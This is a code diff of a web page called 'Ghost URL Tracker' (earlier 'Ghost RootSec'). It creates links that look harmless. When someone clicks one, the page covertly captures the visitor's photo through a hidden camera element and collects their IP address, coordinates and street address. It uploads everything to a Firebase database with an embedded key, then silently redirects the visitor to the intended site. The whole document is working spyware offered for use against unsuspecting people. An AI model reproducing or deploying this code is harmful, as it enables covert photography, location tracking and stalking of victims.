@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost RootSec</title>
+    <title>Ghost URL Tracker</title>
     <style>
         :root {
             --primary: #4285f4;
@@ -174,13 +174,17 @@
             margin-top: 15px;
         }
         
-        .photo-preview {
+        .photo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .captured-photo {
             max-width: 100%;
-            max-height: 60vh;
-            display: block;
-            margin: 15px auto;
+            max-height: 300px;
             border: 1px solid #ddd;
             border-radius: 4px;
+            margin-top: 10px;
         }
         
         /* Hidden camera elements */
@@ -211,19 +215,19 @@
 <body>
     <div class="container">
         <header>
-            <h1>Ghost ☠</h1>
-            <p>Selamat datang di ghost ☠</p>
+            <h1>Ghost URL Tracker</h1>
+            <p>Track clicks with hidden camera capture</p>
         </header>
 
         <div class="content">
             <div class="input-section">
-                <h2>Create Ghost Link</h2>
+                <h2>Create Tracking Link</h2>
                 <div class="input-group">
                     <input type="text" id="target-url" placeholder="Enter target URL (e.g., https://example.com)">
                     <button id="generate-btn" class="btn-primary">Generate Link</button>
                 </div>
                 <div class="result-box" id="tracking-result">
-                    <p>Your Ghost link 👀:</p>
+                    <p>Your tracking link:</p>
                     <div class="url-display">
                         <input type="text" id="tracking-url" readonly>
                         <button id="copy-btn" class="btn-success">Copy</button>
@@ -233,7 +237,7 @@
             </div>
 
             <div class="tracking-results">
-                <h2>Ghost Results</h2>
+                <h2>Tracking Results</h2>
                 <div class="controls">
                     <button id="refresh-btn" class="btn-primary">Refresh Data</button>
                     <button id="clear-btn" class="btn-danger">Clear All Data</button>
@@ -266,21 +270,21 @@
     <div id="details-modal" class="modal">
         <div class="modal-content">
             <span class="close-btn">&times;</span>
-            <h3>Detailed Ghost Data</h3>
-            <div id="details-content">
-                <div id="photo-container" style="text-align: center; margin-bottom: 20px;">
-                    <!-- Photo will be inserted here -->
-                </div>
-                <div id="tracking-details">
-                    <!-- Other details will be inserted here -->
-                </div>
+            <h3>Detailed Tracking Data</h3>
+            <div class="photo-container">
+                <h4>Captured Photo</h4>
+                <img id="captured-photo" class="captured-photo" src="" alt="Captured photo">
+                <p id="photo-timestamp"><small>No photo available</small></p>
+            </div>
+            <div id="tracking-details">
+                <!-- Tracking details will be inserted here -->
             </div>
             <div id="json-content" class="json-viewer"></div>
         </div>
     </div>
 
     <script>
-    // Firebase configuration (replace with your own)
+    // Firebase configuration
     const firebaseConfig = {
         apiKey: "AIzaSyDVGNv1TJynxk--MC9dbYb3GpUhSgd4Kqs",
         authDomain: "xhinta01-tools.firebaseapp.com",
@@ -296,28 +300,51 @@
     const database = firebase.database();
 
     // DOM Elements
-    const targetUrlInput = document.getElementById('target-url');
-    const generateBtn = document.getElementById('generate-btn');
-    const trackingResult = document.getElementById('tracking-result');
-    const trackingUrlInput = document.getElementById('tracking-url');
-    const copyBtn = document.getElementById('copy-btn');
-    const refreshBtn = document.getElementById('refresh-btn');
-    const clearBtn = document.getElementById('clear-btn');
-    const resultsBody = document.getElementById('results-body');
-    const detailsModal = document.getElementById('details-modal');
-    const photoContainer = document.getElementById('photo-container');
-    const trackingDetails = document.getElementById('tracking-details');
-    const jsonContent = document.getElementById('json-content');
-    const closeBtns = document.querySelectorAll('.close-btn');
-    
-    // Camera elements
-    const cameraPreview = document.getElementById('camera-preview');
-    const cameraCanvas = document.getElementById('camera-canvas');
+    const elements = {
+        targetUrlInput: document.getElementById('target-url'),
+        generateBtn: document.getElementById('generate-btn'),
+        trackingResult: document.getElementById('tracking-result'),
+        trackingUrlInput: document.getElementById('tracking-url'),
+        copyBtn: document.getElementById('copy-btn'),
+        refreshBtn: document.getElementById('refresh-btn'),
+        clearBtn: document.getElementById('clear-btn'),
+        resultsBody: document.getElementById('results-body'),
+        detailsModal: document.getElementById('details-modal'),
+        capturedPhoto: document.getElementById('captured-photo'),
+        photoTimestamp: document.getElementById('photo-timestamp'),
+        trackingDetails: document.getElementById('tracking-details'),
+        jsonContent: document.getElementById('json-content'),
+        cameraPreview: document.getElementById('camera-preview'),
+        cameraCanvas: document.getElementById('camera-canvas'),
+        closeBtns: document.querySelectorAll('.close-btn')
+    };
+
     let cameraStream = null;
 
+    // Initialize the application
+    function init() {
+        setupEventListeners();
+        loadTrackingResults();
+        checkForTrackingRequest();
+    }
+
+    // Set up all event listeners
+    function setupEventListeners() {
+        elements.generateBtn.addEventListener('click', generateTrackingUrl);
+        elements.copyBtn.addEventListener('click', copyToClipboard);
+        elements.refreshBtn.addEventListener('click', loadTrackingResults);
+        elements.clearBtn.addEventListener('click', clearAllData);
+        
+        elements.closeBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                elements.detailsModal.style.display = 'none';
+            });
+        });
+    }
+
     // Generate Tracking URL
-    generateBtn.addEventListener('click', function() {
-        const targetUrl = targetUrlInput.value.trim();
+    async function generateTrackingUrl() {
+        const targetUrl = elements.targetUrlInput.value.trim();
         
         if (!targetUrl) {
             alert('Please enter a target URL');
@@ -332,25 +359,25 @@
         }
         
         const trackingId = 'trk_' + Math.random().toString(36).substr(2, 10);
-        const trackingUrl = window.location.origin + window.location.pathname + '?track=' + trackingId + '&url=' + encodeURIComponent(targetUrl);
+        const trackingUrl = `${window.location.origin}${window.location.pathname}?track=${trackingId}&url=${encodeURIComponent(targetUrl)}`;
         
-        trackingUrlInput.value = trackingUrl;
-        trackingResult.style.display = 'block';
+        elements.trackingUrlInput.value = trackingUrl;
+        elements.trackingResult.style.display = 'block';
         
         // Save to Firebase
-        database.ref('trackingLinks/' + trackingId).set({
+        await database.ref('trackingLinks/' + trackingId).set({
             targetUrl: targetUrl,
             createdAt: firebase.database.ServerValue.TIMESTAMP,
             clickCount: 0
         });
-    });
+    }
 
     // Copy to Clipboard
-    copyBtn.addEventListener('click', function() {
-        trackingUrlInput.select();
+    function copyToClipboard() {
+        elements.trackingUrlInput.select();
         document.execCommand('copy');
         alert('Link copied to clipboard!');
-    });
+    }
 
     // Format JSON for display
     function formatJSON(data) {
@@ -364,94 +391,85 @@
     }
 
     // Load Tracking Results from Firebase
-    function loadTrackingResults() {
-        database.ref('trackingData').orderByChild('timestamp').limitToLast(50).once('value')
-            .then((snapshot) => {
-                const data = snapshot.val();
-                if (!data) {
-                    resultsBody.innerHTML = '<tr><td colspan="5">No tracking data available</td></tr>';
-                    return;
-                }
-                
-                // Convert to array and reverse to show latest first
-                const dataArray = Object.entries(data).map(([key, value]) => ({
-                    id: key,
-                    ...value
-                })).reverse();
-                
-                resultsBody.innerHTML = dataArray.map(item => `
-                    <tr>
-                        <td>${formatDate(item.timestamp)}</td>
-                        <td>${item.ip || 'Unknown'}</td>
-                        <td>
-                            ${item.location?.city || 'Unknown'}
-                            ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
-                        </td>
-                        <td>${item.device?.type || 'Unknown'}</td>
-                        <td>
-                            <button class="view-details" data-id="${item.id}">View Details</button>
-                        </td>
-                    </tr>
-                `).join('');
-                
-                // Add event listeners
-                document.querySelectorAll('.view-details').forEach(btn => {
-                    btn.addEventListener('click', function() {
-                        showDetails(this.dataset.id);
-                    });
+    async function loadTrackingResults() {
+        try {
+            const snapshot = await database.ref('trackingData').orderByChild('timestamp').limitToLast(50).once('value');
+            const data = snapshot.val();
+            
+            if (!data) {
+                elements.resultsBody.innerHTML = '<tr><td colspan="5">No tracking data available</td></tr>';
+                return;
+            }
+            
+            // Convert to array and reverse to show latest first
+            const dataArray = Object.entries(data).map(([key, value]) => ({
+                id: key,
+                ...value
+            })).reverse();
+            
+            elements.resultsBody.innerHTML = dataArray.map(item => `
+                <tr>
+                    <td>${formatDate(item.timestamp)}</td>
+                    <td>${item.ip || 'Unknown'}</td>
+                    <td>
+                        ${item.location?.city || 'Unknown'}
+                        ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
+                    </td>
+                    <td>${item.device?.type || 'Unknown'}</td>
+                    <td>
+                        <button class="view-details" data-id="${item.id}">View Details</button>
+                    </td>
+                </tr>
+            `).join('');
+            
+            // Add event listeners to detail buttons
+            document.querySelectorAll('.view-details').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    showDetails(btn.dataset.id);
                 });
-            })
-            .catch(error => {
-                console.error('Error loading data:', error);
-                resultsBody.innerHTML = '<tr><td colspan="5">Error loading data</td></tr>';
             });
+        } catch (error) {
+            console.error('Error loading data:', error);
+            elements.resultsBody.innerHTML = '<tr><td colspan="5">Error loading data</td></tr>';
+        }
     }
 
     // Show detailed tracking data
-    function showDetails(id) {
-        database.ref('trackingData/' + id).once('value')
-            .then((snapshot) => {
-                const data = snapshot.val();
-                if (!data) return;
-                
-                // Clear previous content
-                photoContainer.innerHTML = '';
-                trackingDetails.innerHTML = '';
-                
-                // Display photo if available
-                if (data.cameraCapture?.imageData) {
-                    photoContainer.innerHTML = `
-                        <h4>Captured Photo</h4>
-                        <img src="${data.cameraCapture.imageData}" class="photo-preview">
-                        <p><small>Captured at: ${formatDate(data.cameraCapture.timestamp)}</small></p>
-                    `;
-                } else {
-                    photoContainer.innerHTML = '<p>No photo available</p>';
-                }
-                
-                // Display other tracking details
-                trackingDetails.innerHTML = `
-                    <h4>Tracking Details</h4>
-                    <p><strong>Target URL:</strong> ${data.target || 'Unknown'}</p>
-                    <p><strong>Time:</strong> ${formatDate(data.timestamp)}</p>
-                    <p><strong>IP Address:</strong> ${data.ip || 'Unknown'}</p>
-                    <p><strong>Location:</strong> ${data.location?.city || 'Unknown'} (${data.latitude || '?'}, ${data.longitude || '?'})</p>
-                    <p><strong>Device:</strong> ${data.device?.type || 'Unknown'} (${data.device?.platform || 'Unknown'})</p>
-                    <p><strong>User Agent:</strong> ${data.userAgent || 'Unknown'}</p>
-                `;
-                
-                // Show raw JSON data
-                jsonContent.textContent = formatJSON(data);
-                detailsModal.style.display = 'flex';
-            });
+    async function showDetails(id) {
+        try {
+            const snapshot = await database.ref('trackingData/' + id).once('value');
+            const data = snapshot.val();
+            
+            if (!data) return;
+            
+            // Display photo if available
+            if (data.cameraCapture?.imageData) {
+                elements.capturedPhoto.src = data.cameraCapture.imageData;
+                elements.photoTimestamp.innerHTML = `<small>Captured at: ${formatDate(data.cameraCapture.timestamp)}</small>`;
+                elements.capturedPhoto.style.display = 'block';
+            } else {
+                elements.capturedPhoto.style.display = 'none';
+                elements.photoTimestamp.textContent = 'No photo available';
+            }
+            
+            // Display other tracking details
+            elements.trackingDetails.innerHTML = `
+                <h4>Tracking Details</h4>
+                <p><strong>Target URL:</strong> ${data.target || 'Unknown'}</p>
+                <p><strong>Time:</strong> ${formatDate(data.timestamp)}</p>
+                <p><strong>IP Address:</strong> ${data.ip || 'Unknown'}</p>
+                <p><strong>Location:</strong> ${data.location?.city || 'Unknown'} (${data.latitude || '?'}, ${data.longitude || '?'})</p>
+                <p><strong>Device:</strong> ${data.device?.type || 'Unknown'} (${data.device?.platform || 'Unknown'})</p>
+                <p><strong>User Agent:</strong> ${data.userAgent || 'Unknown'}</p>
+            `;
+            
+            // Show raw JSON data
+            elements.jsonContent.textContent = formatJSON(data);
+            elements.detailsModal.style.display = 'flex';
+        } catch (error) {
+            console.error('Error showing details:', error);
+        }
     }
-
-    // Close modals
-    closeBtns.forEach(btn => {
-        btn.addEventListener('click', function() {
-            detailsModal.style.display = 'none';
-        });
-    });
 
     // Initialize camera
     async function initCamera() {
@@ -464,7 +482,7 @@
                 },
                 audio: false 
             });
-            cameraPreview.srcObject = cameraStream;
+            elements.cameraPreview.srcObject = cameraStream;
             return true;
         } catch (err) {
             console.error('Camera access error:', err);
@@ -477,8 +495,8 @@
         if (!cameraStream) return null;
         
         try {
-            const canvas = cameraCanvas;
-            const video = cameraPreview;
+            const canvas = elements.cameraCanvas;
+            const video = elements.cameraPreview;
             
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -496,30 +514,33 @@
         }
     }
 
-    // Refresh Data
-    refreshBtn.addEventListener('click', loadTrackingResults);
-
-    // Clear Data (admin only - for demo purposes)
-    clearBtn.addEventListener('click', function() {
+    // Clear All Data
+    async function clearAllData() {
         if (confirm('WARNING: This will delete ALL tracking data. Continue?')) {
-            database.ref('trackingData').remove()
-                .then(() => {
-                    alert('All tracking data has been cleared');
-                    loadTrackingResults();
-                })
-                .catch(error => {
-                    console.error('Error clearing data:', error);
-                    alert('Failed to clear data');
-                });
+            try {
+                await database.ref('trackingData').remove();
+                alert('All tracking data has been cleared');
+                loadTrackingResults();
+            } catch (error) {
+                console.error('Error clearing data:', error);
+                alert('Failed to clear data');
+            }
         }
-    });
+    }
 
-    // Process tracking when URL has parameters
-    const urlParams = new URLSearchParams(window.location.search);
-    const trackingId = urlParams.get('track');
-    const targetUrl = urlParams.get('url');
-    
-    if (trackingId && targetUrl) {
+    // Check for tracking request in URL
+    function checkForTrackingRequest() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('track');
+        const targetUrl = urlParams.get('url');
+        
+        if (trackingId && targetUrl) {
+            processTrackingRequest(trackingId, targetUrl);
+        }
+    }
+
+    // Process tracking request
+    async function processTrackingRequest(trackingId, targetUrl) {
         // Collect device and network data
         const trackingData = {
             timestamp: firebase.database.ServerValue.TIMESTAMP,
@@ -546,8 +567,8 @@
             }
         };
 
-        // Initialize camera and capture photo
-        const processCamera = async () => {
+        try {
+            // Initialize camera and capture photo
             const cameraAccess = await initCamera();
             if (cameraAccess) {
                 const photoData = await capturePhoto();
@@ -556,76 +577,65 @@
                         timestamp: firebase.database.ServerValue.TIMESTAMP,
                         imageData: photoData,
                         imageSize: {
-                            width: cameraCanvas.width,
-                            height: cameraCanvas.height
+                            width: elements.cameraCanvas.width,
+                            height: elements.cameraCanvas.height
                         }
                     };
                 }
             }
-        };
 
-        // Get IP and location data
-        const processLocation = async () => {
-            try {
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
+            // Get IP and location data
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            
+            trackingData.ip = ipData.ip;
+            trackingData.latitude = ipData.latitude;
+            trackingData.longitude = ipData.longitude;
+            trackingData.location = {
+                city: ipData.city,
+                region: ipData.region,
+                country: ipData.country_name,
+                countryCode: ipData.country_code,
+                postalCode: ipData.postal,
+                timezone: ipData.timezone
+            };
+            
+            // Get detailed address from Nominatim
+            if (ipData.latitude && ipData.longitude) {
+                const nominatimResponse = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
+                );
+                const nominatimData = await nominatimResponse.json();
                 
-                trackingData.ip = ipData.ip;
-                trackingData.latitude = ipData.latitude;
-                trackingData.longitude = ipData.longitude;
-                trackingData.location = {
-                    city: ipData.city,
-                    region: ipData.region,
-                    country: ipData.country_name,
-                    countryCode: ipData.country_code,
-                    postalCode: ipData.postal,
-                    timezone: ipData.timezone
+                trackingData.nominatim = {
+                    display_name: nominatimData.display_name,
+                    address: nominatimData.address,
+                    boundingbox: nominatimData.boundingbox
                 };
-                
-                // Get detailed address from Nominatim
-                if (ipData.latitude && ipData.longitude) {
-                    const nominatimResponse = await fetch(
-                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=18&addressdetails=1`
-                    );
-                    const nominatimData = await nominatimResponse.json();
-                    
-                    trackingData.nominatim = {
-                        display_name: nominatimData.display_name,
-                        address: nominatimData.address,
-                        boundingbox: nominatimData.boundingbox
-                    };
-                }
-            } catch (error) {
-                console.error('Error fetching location:', error);
             }
-        };
 
-        // Execute all async operations
-        Promise.all([processCamera(), processLocation()])
-            .then(() => {
-                // Save to Firebase
-                const newTrackingRef = database.ref('trackingData').push();
-                newTrackingRef.set(trackingData);
-                
-                // Update click count
-                database.ref('trackingLinks/' + trackingId).transaction(link => {
-                    if (link) {
-                        link.clickCount = (link.clickCount || 0) + 1;
-                    }
-                    return link;
-                });
-                
-                // Redirect to target URL
-                window.location.href = decodeURIComponent(targetUrl);
-            })
-            .catch(error => {
-                console.error('Error in tracking process:', error);
-                window.location.href = decodeURIComponent(targetUrl);
+            // Save to Firebase
+            const newTrackingRef = database.ref('trackingData').push();
+            await newTrackingRef.set(trackingData);
+            
+            // Update click count
+            await database.ref('trackingLinks/' + trackingId).transaction(link => {
+                if (link) {
+                    link.clickCount = (link.clickCount || 0) + 1;
+                }
+                return link;
             });
+            
+            // Redirect to target URL
+            window.location.href = decodeURIComponent(targetUrl);
+        } catch (error) {
+            console.error('Error in tracking process:', error);
+            window.location.href = decodeURIComponent(targetUrl);
+        }
     }
 
-    // Initial load
-    loadTrackingResults();
+    // Initialize the application
+    init();
     </script>
 </body>
 </html>
